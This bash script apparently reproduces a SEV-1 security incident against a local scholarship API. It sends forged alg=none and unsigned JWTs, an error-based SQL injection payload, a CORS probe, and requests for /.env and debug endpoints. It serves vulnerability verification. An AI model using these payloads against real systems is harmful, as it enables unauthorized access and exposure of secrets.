#!/bin/bash
# SEV-1 Security Incident - Reproduction Commands
# Run these commands to verify each critical vulnerability

BASE_URL="http://localhost:5000"
echo "=== SEV-1 SECURITY VULNERABILITY REPRODUCTION ==="
echo "Base URL: $BASE_URL"
echo "Timestamp: $(date)"
echo ""

echo "1. JWT VALIDATION BYPASS - alg=none attack"
echo "Expected: HTTP 401, Observed: HTTP 200"
curl -i -X GET "$BASE_URL/api/v1/scholarships" \
  -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTYzMDAwMDAwMH0."
echo -e "\n"

echo "2. JWT VALIDATION BYPASS - empty signature"
echo "Expected: HTTP 401, Observed: HTTP 200"
curl -i -X GET "$BASE_URL/api/v1/scholarships" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTYzMDAwMDAwMH0."
echo -e "\n"

echo "3. JWT VALIDATION BYPASS - malformed token"
echo "Expected: HTTP 401, Observed: HTTP 200"
curl -i -X GET "$BASE_URL/api/v1/search" \
  -H "Authorization: Bearer invalid.token.here"
echo -e "\n"

echo "4. SQL INJECTION - error-based injection"
echo "Expected: Generic error, Observed: SQL error details exposed"
curl -i -X GET "$BASE_URL/api/v1/eligibility/check" \
  --data-urlencode "field_of_study=1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
echo -e "\n"

echo "5. CORS BYPASS - malicious origin acceptance"
echo "Expected: Origin rejection, Observed: Origin allowed"
curl -i -X OPTIONS "$BASE_URL/api/v1/scholarships" \
  -H "Origin: http://localhost:3000" \
  -H "Access-Control-Request-Method: GET" \
  -H "Access-Control-Request-Headers: authorization"
echo -e "\n"

echo "6. SENSITIVE DATA EXPOSURE - debug endpoints"
echo "Expected: HTTP 404, Observed: Sensitive data exposed"
echo "--- Testing /.env endpoint ---"
curl -i -X GET "$BASE_URL/.env"
echo ""
echo "--- Testing /config endpoint ---" 
curl -i -X GET "$BASE_URL/config"
echo ""
echo "--- Testing /debug endpoint ---"
curl -i -X GET "$BASE_URL/debug"
echo -e "\n"

echo "=== VULNERABILITY REPRODUCTION COMPLETE ==="
echo "If any of the above commands return HTTP 200 when expecting HTTP 401/400/404,"
echo "the vulnerability is confirmed in the current deployment."